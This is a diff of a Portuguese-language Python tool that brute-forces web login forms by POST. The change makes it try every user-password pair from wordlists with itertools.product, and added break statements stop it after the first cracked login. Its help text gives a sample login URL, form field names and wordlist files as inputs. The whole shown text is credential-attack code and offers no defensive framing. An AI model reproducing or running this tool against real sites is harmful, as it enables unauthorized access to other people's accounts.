@@ -17,7 +17,7 @@ try:
 		file_user = open(diruser)
 
 		error = input('\033[1;32mQuando da Error: \033[1;31m')
-		for pws, uss in  zip(file_pw.readlines(), file_user.readlines()):
+		for uss, pws in itertools.product(file_user.readlines(), file_pw.readlines()):
 			
 			uss = uss.rstrip('\n')
 			pws = pws.rstrip('\n')
@@ -28,6 +28,7 @@ try:
 				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(uss, pws))
 			else:
 				print("\033[1;92mUser: {} senha: {} Quebro :)".format(uss, pws))
+				break
 	def passs():
 		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser:\033[1;32m joaozinho\n \033[1;33mSenhas Wordlist:\033[1;32m pass.txt\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")
 
@@ -52,6 +53,7 @@ try:
 				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(user, pws))
 			else:
 				print("\033[1;92mUser: {} senha: {} Quebro :)".format(user, pws))
+				break
 	def usu():
 		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser ou Email WordList:\033[1;32m users.txt\n \033[1;33mSenha:\033[1;32m senha\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")
 
@@ -75,6 +77,7 @@ try:
 				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(uss, pw))
 			else:
 				print("\033[1;92mUser: {} senha: {} Quebro :)".format(uss, pw))
+				break
 
 	def error():
 		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n")
